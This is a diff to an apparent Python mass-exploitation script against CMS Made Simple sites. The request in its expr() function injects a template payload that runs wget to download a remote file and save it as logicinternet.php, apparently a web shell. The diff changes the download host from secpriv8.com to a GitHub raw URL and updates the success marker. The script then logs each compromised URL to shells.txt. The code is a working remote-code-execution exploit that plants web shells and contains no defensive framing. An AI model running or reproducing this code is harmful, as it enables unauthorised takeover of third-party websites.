@@ -85,9 +85,9 @@ print '\x1b[91m[\x1b[92m+\x1b[91m]\x1b[92mTOTAL WEBLIST=',count
 def expr(url):
 	try:
 		headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20150151 Firefox/28.0'}
-		korek = requests.get(url+'/index.php?mact=News,cntnt01,detail,0&cntnt01articleid=1&cntnt01detailtemplate=string:{php}echo%20system(%2527wget%20http://secpriv8.com/met.txt%20-O%20logicinternet.php%2527);{/php}&cntnt01returnid=1', headers=headers,timeout=10)
+		korek = requests.get(url+'/index.php?mact=News,cntnt01,detail,0&cntnt01articleid=1&cntnt01detailtemplate=string:{php}echo%20system(%2527wget%20https://raw.githubusercontent.com/Jenderal92/shin/main/shincode.txt%20-O%20logicinternet.php%2527);{/php}&cntnt01returnid=1', headers=headers,timeout=10)
 		asu = requests.get(url+'/logicinternet.php',headers=headers,timeout=5)
-		if 'Logic_Internet' in asu.content:
+		if 'Jenderal92' in asu.content:
 			print ('Logic: ' + url + ' ' + ktn6blueblue+ 'Made Simple CMS' +ktngreen + ' Success' + CEND)
 			open('shells.txt','a').write(url+'/logicinternet.php\n')
 		else:
